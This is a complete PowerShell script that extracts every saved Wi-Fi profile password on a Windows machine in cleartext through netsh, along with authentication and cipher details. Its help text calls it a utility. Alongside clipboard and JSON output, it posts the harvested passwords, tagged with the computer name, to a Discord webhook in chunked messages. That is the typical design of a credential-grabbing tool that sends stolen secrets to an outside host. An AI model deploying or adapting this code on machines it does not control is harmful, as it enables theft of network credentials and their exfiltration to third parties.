<#
.SYNOPSIS
    Retrieves saved Wi-Fi network passwords and security details on Windows.

.DESCRIPTION
    Scans saved Wi-Fi profiles via netsh, parses authentication types, ciphers,
    auto-connection status, and cleartext passwords. Supports filtering by SSID,
    copying to clipboard, JSON output, returning pipeline objects, and securely
    sending reports to a Discord webhook with automatic message chunking.

.PARAMETER Target
    Positional parameter. Can be either an SSID pattern filter (e.g. 'Home*', 'Office')
    or a Discord webhook URL (starting with http:// or https://).

.PARAMETER Name
    Filter profiles by SSID using wildcards or regex (e.g. 'Home*', '*Guest*').

.PARAMETER Show
    Explicitly display results in a formatted table on the console.

.PARAMETER Url
    Discord webhook URL. If omitted, checks $env:DISCORD_WEBHOOK_URL or a local .env file.

.PARAMETER Discord
    Send the results to the configured Discord webhook.

.PARAMETER Clipboard
    Copy the password (if single profile) or results table to the Windows clipboard.

.PARAMETER AsJson
    Output results as a formatted JSON string.

.PARAMETER PassThru
    Pass objects to the pipeline even when sending to Discord or copying to clipboard.

.EXAMPLE
    .\pass.ps1
    Displays all saved Wi-Fi profiles and passwords.

.EXAMPLE
    .\pass.ps1 "Orange*"
    Filters profiles matching 'Orange*'.

.EXAMPLE
    .\pass.ps1 -Clipboard
    Copies all saved Wi-Fi profiles to the clipboard.

.EXAMPLE
    .\pass.ps1 Orange -Clipboard
    Copies the password for 'Orange' directly to the clipboard.

.EXAMPLE
    .\pass.ps1 -Discord
    Sends saved Wi-Fi profiles to the webhook configured in $env:DISCORD_WEBHOOK_URL or .env.

.EXAMPLE
    .\pass.ps1 -Url "https://discord.com/api/webhooks/..." -Show
    Sends passwords to Discord and displays them on the console.
#>

[CmdletBinding(DefaultParameterSetName = 'Default')]
param(
    [Parameter(Position = 0)]
    [Alias('Filter', 'SSID')]
    [string]$Target,

    [string]$Name,

    [Alias('s', 'Table')]
    [switch]$Show,

    [Alias('u', 'Webhook')]
    [string]$Url,

    [Alias('Send')]
    [switch]$Discord,

    [Alias('c', 'Copy')]
    [switch]$Clipboard,

    [switch]$AsJson,

    [switch]$PassThru
)

# -------------------------------------------------------------------------
# Argument Normalization
# -------------------------------------------------------------------------
if ($Target) {
    if ($Target -match '^https?://') {
        if (-not $Url) { $Url = $Target }
    } elseif (-not $Name) {
        $Name = $Target
    }
}

# -------------------------------------------------------------------------
# Webhook URL Resolution (Parameter > $env:DISCORD_WEBHOOK_URL > .env)
# -------------------------------------------------------------------------
$resolvedUrl = if ($Url) {
    $Url
} elseif ($env:DISCORD_WEBHOOK_URL) {
    $env:DISCORD_WEBHOOK_URL
} else {
    $envCandidates = @(
        (Join-Path $PSScriptRoot ".env"),
        (Join-Path (Get-Location) ".env")
    ) | Where-Object { Test-Path $_ }

    $found = $null
    foreach ($envFile in $envCandidates) {
        $matched = Get-Content $envFile -ErrorAction SilentlyContinue |
            Select-String '^\s*DISCORD_WEBHOOK_URL\s*=\s*(.+)$' |
            Select-Object -First 1
        if ($matched) {
            $found = $matched.Matches.Groups[1].Value.Trim().Trim('"', "'")
            if ($found) { break }
        }
    }
    $found
}

$shouldSendDiscord = [bool]$Url -or $Discord
if ($shouldSendDiscord -and -not $resolvedUrl) {
    Write-Error "No Discord webhook URL found. Provide -Url <url>, set `$env:DISCORD_WEBHOOK_URL, or define DISCORD_WEBHOOK_URL in a .env file."
    return
}

# -------------------------------------------------------------------------
# Profile Discovery
# -------------------------------------------------------------------------
$wlanSvc = Get-Service -Name 'WlanSvc' -ErrorAction SilentlyContinue
if ($wlanSvc -and $wlanSvc.Status -ne 'Running') {
    Write-Warning "WLAN AutoConfig service ('WlanSvc') is not running. Profiles may not be queryable."
}

$rawProfiles = & netsh wlan show profiles 2>&1
if ($LASTEXITCODE -ne 0 -or -not $rawProfiles) {
    Write-Warning "Unable to query WLAN profiles. Ensure wireless service is running and supported."
    return
}

# Match English profile entries: "All User Profile : <name>"
$profileNames = @($rawProfiles | Select-String 'All User Profile\s*:\s*(.+)' | ForEach-Object {
    $_.Matches.Groups[1].Value.Trim()
})

# Multilingual fallback: match any indented line with colon excluding <None> / headers
if ($profileNames.Count -eq 0) {
    $profileNames = @($rawProfiles | Where-Object {
        $_ -match '^\s+[^:]+:\s*(.+)$' -and $_ -notmatch '^\s*<\s*None\s*>' -and $_ -notmatch 'Profiles on interface'
    } | ForEach-Object {
        $Matches[1].Trim()
    })
}

if ($profileNames.Count -eq 0) {
    Write-Warning "No saved Wi-Fi profiles found on this system."
    return
}

# -------------------------------------------------------------------------
# Password and Security Attribute Extraction
# -------------------------------------------------------------------------
# Register default display properties for cleaner console output
Update-TypeData -TypeName 'WifiProfile' -DefaultDisplayPropertySet 'SSID', 'Password', 'Auth', 'Cipher' -Force -ErrorAction SilentlyContinue

$profiles = foreach ($pName in $profileNames) {
    $detail = & netsh wlan show profile "name=$pName" key=clear 2>&1

    # Key Content extraction (English + common multilingual patterns)
    $keyMatch = $detail | Select-String -Pattern '(?:Key Content|Contenu de la cl|Contenido de la clave|Schl[uü]sselinhalt|Contenuto chiave|Conteúdo da Chave|Содержимое ключа|关键内容|密钥内容|キー コンテンツ)\s*:\s*(.+)' | Select-Object -First 1

    # Security Key presence
    $secKeyMatch = $detail | Select-String -Pattern 'Security key\s*:\s*(.+)' | Select-Object -First 1
    $secKey = if ($secKeyMatch) { $secKeyMatch.Matches.Groups[1].Value.Trim() } else { '' }

    # Authentication methods
    $authMatches = $detail | Select-String -Pattern 'Authentication\s*:\s*(.+)' | ForEach-Object {
        $_.Matches.Groups[1].Value.Trim()
    } | Select-Object -Unique
    $auth = if ($authMatches) { $authMatches -join ', ' } else { 'Unknown' }

    # Cipher
    $cipherMatches = $detail | Select-String -Pattern 'Cipher\s*:\s*(.+)' | ForEach-Object {
        $_.Matches.Groups[1].Value.Trim()
    } | Select-Object -Unique
    $cipher = if ($cipherMatches) { $cipherMatches -join ', ' } else { 'Unknown' }

    # Connection Mode
    $modeMatch = $detail | Select-String -Pattern 'Connection mode\s*:\s*(.+)' | Select-Object -First 1
    $autoConnect = if ($modeMatch) { $modeMatch.Matches.Groups[1].Value.Trim() -match 'automatically' } else { $false }

    # Resolve password or status description
    $pw = if ($keyMatch) {
        $keyMatch.Matches.Groups[1].Value.Trim()
    } elseif ($secKey -match 'Absent|None' -or $auth -match 'Open') {
        '(Open / None)'
    } elseif ($auth -match 'Enterprise|802\.1x') {
        '(Enterprise / 802.1X)'
    } else {
        '(No Password / Restricted)'
    }

    [PSCustomObject]@{
        PSTypeName  = 'WifiProfile'
        SSID        = $pName
        Password    = $pw
        Auth        = $auth
        Cipher      = $cipher
        AutoConnect = $autoConnect
    }
}

# Apply filter if provided
if ($Name) {
    $profiles = @($profiles | Where-Object { $_.SSID -like $Name -or $_.SSID -match [regex]::Escape($Name) })
    if ($profiles.Count -eq 0) {
        Write-Warning "No Wi-Fi profile matched filter: '$Name'"
        return
    }
}

# -------------------------------------------------------------------------
# Clipboard Handling
# -------------------------------------------------------------------------
if ($Clipboard) {
    if (Get-Command Set-Clipboard -ErrorAction SilentlyContinue) {
        $singleMatch = if ($profiles.Count -eq 1) {
            $profiles[0]
        } elseif ($Name) {
            $profiles | Where-Object { $_.SSID -eq $Name } | Select-Object -First 1
        } else {
            $null
        }

        if ($singleMatch) {
            $singleMatch.Password | Set-Clipboard
            Write-Host "[+] Copied password for '$($singleMatch.SSID)' to clipboard." -ForegroundColor Green
        } else {
            $profiles | Format-Table -Property SSID, Password, Auth, Cipher -AutoSize | Out-String | Set-Clipboard
            Write-Host "[+] Copied $($profiles.Count) Wi-Fi profile(s) to clipboard." -ForegroundColor Green
        }
    } else {
        Write-Warning "Set-Clipboard is not available in this environment."
    }
}

# -------------------------------------------------------------------------
# Discord Webhook Delivery
# -------------------------------------------------------------------------
if ($shouldSendDiscord) {
    $headerText = "{0,-32} {1,-26} {2}" -f "SSID", "Auth", "Password"
    $separator  = "{0,-32} {1,-26} {2}" -f ("-" * 32), ("-" * 26), ("-" * 22)

    $rows = @()
    foreach ($item in $profiles) {
        $rows += ("{0,-32} {1,-26} {2}" -f $item.SSID, $item.Auth, $item.Password)
    }

    # Group lines into chunks safely within Discord's 2000 character limit
    $chunks = [System.Collections.Generic.List[string]]::new()
    $currentChunkLines = [System.Collections.Generic.List[string]]::new()
    $currentLength = 0

    foreach ($line in $rows) {
        $addedLength = $line.Length + 1
        if ($currentChunkLines.Count -gt 0 -and ($currentLength + $addedLength) -gt 1600) {
            $chunks.Add(($currentChunkLines -join "`n"))
            $currentChunkLines.Clear()
            $currentLength = 0
        }
        $currentChunkLines.Add($line)
        $currentLength += $addedLength
    }
    if ($currentChunkLines.Count -gt 0) {
        $chunks.Add(($currentChunkLines -join "`n"))
    }

    $total = $chunks.Count
    for ($i = 0; $i -lt $total; $i++) {
        $partLabel = if ($total -gt 1) { " (Part $($i + 1)/$total)" } else { "" }
        $title = "**Wi-Fi Passwords** — ``$env:COMPUTERNAME``$partLabel"
        $body = "$title`n``````text`n$headerText`n$separator`n$($chunks[$i])`n``````"

        $payload = [ordered]@{ content = $body } | ConvertTo-Json -Compress
        $utf8Bytes = [System.Text.Encoding]::UTF8.GetBytes($payload)

        try {
            Invoke-RestMethod -Uri $resolvedUrl -Method Post -ContentType 'application/json; charset=utf-8' -Body $utf8Bytes -ErrorAction Stop | Out-Null
            Write-Host "[+] Sent chunk $($i + 1)/$total to Discord webhook." -ForegroundColor Green
        } catch {
            Write-Error "Failed to send chunk $($i + 1)/$total to Discord: $($_.Exception.Message)"
        }

        if ($i -lt ($total - 1)) {
            Start-Sleep -Milliseconds 350
        }
    }
}

# -------------------------------------------------------------------------
# Output Rendering
# -------------------------------------------------------------------------
if ($AsJson) {
    $profiles | ConvertTo-Json -Depth 3
} elseif ($Show) {
    $profiles | Format-Table -Property SSID, Password, Auth, Cipher, AutoConnect -AutoSize
} elseif (-not $shouldSendDiscord -or $PassThru) {
    $profiles
}
